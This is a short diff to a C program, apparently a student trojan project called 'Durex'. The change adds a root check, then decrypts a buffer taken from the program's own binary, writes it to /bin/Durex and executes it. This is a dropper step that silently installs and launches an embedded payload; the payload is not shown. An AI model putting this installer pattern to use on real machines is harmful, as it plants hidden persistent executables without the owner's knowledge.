@@ -5,6 +5,7 @@
 #include <sys/stat.h>
 #include <string.h>
 #include <stdlib.h>
+#include <stdbool.h>
 
 static char	*ft_decrypt(char *buff, off_t size)
 {
@@ -18,6 +19,17 @@ static char	*ft_decrypt(char *buff, off_t size)
 	return (buff);
 }
 
+static bool	check_root(void)
+{
+	if (getuid() != 0)
+	{
+		puts("Permission denied. Are you root ?");
+		return (false);
+	}
+	return (true);
+}
+
+
 int	main(int argc, char **argv)
 {
 	int	fd = 0;
@@ -25,6 +37,8 @@ int	main(int argc, char **argv)
 	struct stat	st;
 
 	(void)argc;
+	if (check_root() == false)
+		return (false);
 	puts("rabougue\nkbensado");
 	fd = open(argv[0], O_RDONLY);
 	if (fd == -1)
@@ -59,13 +73,19 @@ int	main(int argc, char **argv)
 	read(fd, &buff, sizeof(buff));
 	ft_decrypt(buff, (off_t)sizeof(buff));
 	close(fd);
-	remove("./Durex_copy");
-	if ((fd = open("./Durex_copy", O_CREAT | O_RDWR, 0744)) == -1)
+	remove("/bin/Durex");
+	if ((fd = open("/bin/Durex", O_CREAT | O_RDWR, 0744)) == -1)
 	{
 		perror("open");
 		return (errno);
 	}
 	write(fd, &buff, sizeof(buff));
+	//temporaire
+	char	*exec[] = {"/bin/Durex", NULL};
+	if (execve(exec[0], exec, NULL) == -1)
+	{
+		perror("execve");
+	}
 
 	close(fd);
 }
